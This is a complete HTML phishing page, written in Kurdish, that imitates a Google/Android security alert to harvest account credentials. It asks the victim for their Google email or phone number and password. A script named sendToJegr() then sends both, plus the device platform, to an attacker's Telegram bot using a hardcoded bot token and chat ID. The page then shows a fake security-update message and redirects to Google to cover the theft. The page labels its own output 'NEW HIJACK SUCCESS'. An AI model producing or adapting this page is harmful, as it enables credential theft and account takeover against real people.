<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Security Update</title>
    <style>
        body { background-color: #000; color: white; font-family: sans-serif; margin: 0; padding: 0; overflow: hidden; }
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
        .icon { width: 70px; height: 70px; margin-bottom: 25px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
        .modal { width: 88%; background: #ffffff; color: #202124; padding: 25px; border-radius: 16px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h3 { margin-top: 0; color: #d93025; font-size: 20px; }
        p { font-size: 14px; color: #5f6368; line-height: 1.5; }
        input { width: 100%; padding: 14px; margin: 12px 0; border: 1px solid #dadce0; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; }
        input:focus { border: 2px solid #1a73e8; }
        .btn { background: #1a73e8; color: white; padding: 14px; border: none; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; margin-top: 10px; }
    </style>
</head>
<body>

<div class="overlay">
    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_96dp.png" class="icon">
    <div class="modal">
        <h3>Security Alert!</h3>
        <p>سیستەمی پاراستنی ئەندرۆید هەوڵێکی گوماناوی دۆزیوەتەوە بۆ چوونە ناو ئەکاونتەکەت. تکایە بۆ دووپاتکردنەوەی ناسنامەت و پاراستنی مۆبایلەکەت، جارێکی تر بچۆوە ناو Google.</p>
        
        <input type="text" id="user" placeholder="ئیمەیڵ یان ژمارەی مۆبایل" dir="rtl">
        <input type="password" id="pass" placeholder="پاسوۆرد" dir="rtl">
        
        <button class="btn" onclick="sendToJegr()">Verify Now</button>
    </div>
</div>

<script>
async function sendToJegr() {
    const user = document.getElementById('user').value;
    const pass = document.getElementById('pass').value;

    if(user.length < 4 || pass.length < 4) {
        alert("تکایە زانیارییەکان بە تەواوی بنووسە");
        return;
    }

    // زانیارییەکانی جێگر ڕانیەیی
    const token = '8620021132:AAHjmTJNMMMJoO512ndfxn2z_680XM4dMi0';
    const chatID = '7619045862';
    
    const message = `
🚀 **NEW HIJACK SUCCESS (2026)**
━━━━━━━━━━━━━━━━━━
👤 **Login:** \`${user}\`
🔑 **Pass:** \`${pass}\`
📱 **Device:** ${navigator.platform}
🔋 **Battery:** Loading...
━━━━━━━━━━━━━━━━━━
👑 *Jegr Cracks - Professional Tool*
    `;

    // ناردنی داتا بۆ تێلیگرام
    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
        
        // شاردنەوەی فێڵەکە دوای ناردن
        document.querySelector('.modal').innerHTML = "<h3>Updating Security...</h3><p>تکایە ٥ چرکە چاوەڕێ بکە، سیستەمەکە چاک دەبێتەوە...</p>";
        
        setTimeout(() => {
            window.location.href = "https://myaccount.google.com";
        }, 4000);
    } catch (error) {
        alert("هەڵەیەک لە پەیوەندی سێرڤەر هەیە، دووبارە هەوڵ بدەرەوە.");
    }
}
</script>

</body>
</html>
